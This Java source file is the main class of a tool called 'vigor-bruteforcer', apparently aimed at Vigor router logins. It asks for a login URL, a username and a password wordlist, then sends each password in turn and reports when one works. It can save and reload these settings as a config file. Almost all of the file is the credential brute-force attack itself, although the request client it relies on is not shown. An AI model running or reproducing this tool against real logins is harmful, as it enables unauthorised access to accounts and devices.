package D4N3;

import java.io.*;
import java.util.ArrayList;
import java.util.Properties;
import java.util.Scanner;

/**
 * 24-11-17
 * vigor-bruteforcer created by Dane Naebers
 */

public class Main {
    private static RequestClient reqClient;
    private static Properties config;
    private static ArrayList<String> passwords;
    private static Scanner scanner;

    public static void main(String[] args) throws IOException {
        scanner = new Scanner(System.in);
        scanner = new Scanner(System.in);
        initialize();
    }

    private static void initialize() throws IOException {
        System.out.println("Do you want to load a previous config file: y/n");
        if (scanner.nextLine().toLowerCase().equals("y")) {
            System.out.println("Enter the absolute path to your config file");
            loadPropertyFile(scanner.nextLine());
            loadPasswordFile(config.getProperty("passFilePath"));
            System.out.println("Press any key to start brute force");
            scanner.nextLine();
            bruteForce();
        }
        config = new Properties();
        System.out.println("Enter the Request URL:");
        config.setProperty("reqUrl", scanner.nextLine());
        System.out.println("Enter the username");
        config.setProperty("username", scanner.nextLine());
        System.out.println("Enter the absolute path of passwords file:");
        config.setProperty("passFilePath", scanner.nextLine());
        loadPasswordFile(config.getProperty("passFilePath"));
        System.out.println("Save these configurations? y/n");
        if (scanner.nextLine().toLowerCase().equals("y")) {
            System.out.println("Enter the absolute path of the save location:");
            saveProperties(scanner.nextLine());
        }
        System.out.println("Press any key to start brute force");
        scanner.nextLine();
        bruteForce();
    }

    private static void loadPropertyFile(String path) {
        try (FileInputStream is = new FileInputStream(path)) {
            config = new Properties();
            config.load(is);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static void loadPasswordFile(String path) {
        try (DataInputStream dis = new DataInputStream(new FileInputStream(path))) {
            passwords = new ArrayList<>();
            while (dis.available() > 0) {
                passwords.add(dis.readLine());
            }
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    private static void saveProperties(String path) {
        String fullPath = path + "config.vrbr";
        try (FileOutputStream fos = new FileOutputStream(fullPath)) {
            config.store(fos, "vigor-bruteforcer configurations");
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    private static void bruteForce() throws IOException {
        for(String s : passwords) {
            reqClient = new RequestClient(config.getProperty("reqUrl"));
            if(reqClient.makeRequest(config.getProperty("username"), s)) {
                System.out.println("Password Cracked :    " + s);
                scanner.nextLine();
                System.exit(0);
            }
            System.out.println(s + " FAILED");
        }
        System.out.println("Password not cracked :(");
        scanner.nextLine();
        System.exit(0);
    }
}
